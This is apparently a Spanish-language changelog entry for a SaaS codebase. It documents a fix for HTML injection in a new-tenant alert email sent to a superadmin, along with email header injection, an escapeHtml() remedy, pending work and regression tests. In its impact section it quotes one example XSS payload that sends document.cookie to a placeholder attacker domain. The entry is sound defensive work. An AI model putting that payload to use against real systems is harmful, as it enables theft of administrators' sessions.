# v1056 — Fix: inyección de HTML en el email de alerta de "nuevo tenant" (saas-alertas.js)

## Hallazgo

`lib/handlers/saas-alertas.js` (`avisarNuevoTenant()`, agregado en v1003)
arma el HTML del email que le llega al superadmin cuando se registra una
empresa nueva, interpolando directo `empresa.nombre`, `empresa.email`,
`empresa.cuit` y `empresa.saas_plan` en el template — sin escapar.

Esos datos vienen tal cual los cargó quien se autoregistra
(`POST /api/registro` → `lib/handlers/registro.js`), donde la única
validación de `empresa_nombre` es que no esté vacío (`.trim()`), sin
restricción de caracteres. El trigger `trg_saas_avisar_nuevo_tenant`
(migración 548) dispara este endpoint con esos valores crudos.

**Impacto:** cualquiera que se autoregistre puede cargar como nombre de
empresa (o email/CUIT, aunque CUIT sí está validado a 11 dígitos por
`validarCUIT`) una cadena con HTML activo — por ejemplo
`<img src=x onerror=fetch('//dominio-atacante/?c='+document.cookie)>` — que
termina en el HTML del email que recibe el superadmin en
`SAAS_ALERTA_EMAIL`. No hay ningún helper de escape de HTML en el proyecto
(`lib/email.js` tampoco sanea nada) — es la primera vez que un dato de un
actor no confiable (un tenant que se autoregistra, no un usuario ya
autenticado del propio sistema) llega a un email que recibe alguien
distinto de quien lo cargó, así que es el primer template de email donde
esto es explotable contra un tercero.

También se corta injection de headers en el `subject` (un `\r\n` dentro
del nombre de empresa podría inyectar headers de email adicionales según
el transporte SMTP subyacente) quitando saltos de línea antes de armar el
asunto.

## Fix

Se agrega un `escapeHtml()` local en `saas-alertas.js` (sin dependencia
nueva) y se aplica a los 4 campos interpolados del template
(`nombre`, `email`, `cuit`, `saas_plan`). Las fechas (`formatFecha`) no se
tocan — pasan por `Date`/`toLocaleString`, no son texto libre del usuario.

## Alcance / pendiente

Este fix es puntual a `saas-alertas.js`. El resto de los templates de
`lib/email.js` (confirmación de pedido, despacho, recuperación de
contraseña, etc.) tiene el mismo patrón de interpolación sin escapar, pero
en todos esos casos el destinatario es la propia empresa/cliente cuyos
datos se muestran (o el propio usuario que dispara la acción) — no un
tercero (el superadmin) recibiendo datos de un actor no confiable. Menor
severidad, pero el mismo patrón — queda como hallazgo a revisar en una
pasada aparte, con el mismo criterio (agregar `escapeHtml()` centralizado
en `lib/email.js` y aplicarlo en todos los templates, en vez de
duplicarlo por archivo).

## Verificación

- `node --check lib/handlers/saas-alertas.js`: OK.
- Test de regresión nuevo, `tests/handlers/saas-alertas-html-injection.test.js`
  (6 tests, mockeando `enviarEmail()`): cubre fail-closed sin
  `INTERNAL_PUSH_SECRET`, 401 con secreto incorrecto, escape de los 4
  campos interpolados (incluye caso `<script>`/`<img onerror>` real), corte
  de `\r\n` en el subject (header injection), y que un nombre normal con
  apóstrofe/ampersand se siga viendo legible tras el escape. Corrido con
  vitest: 6/6 OK.
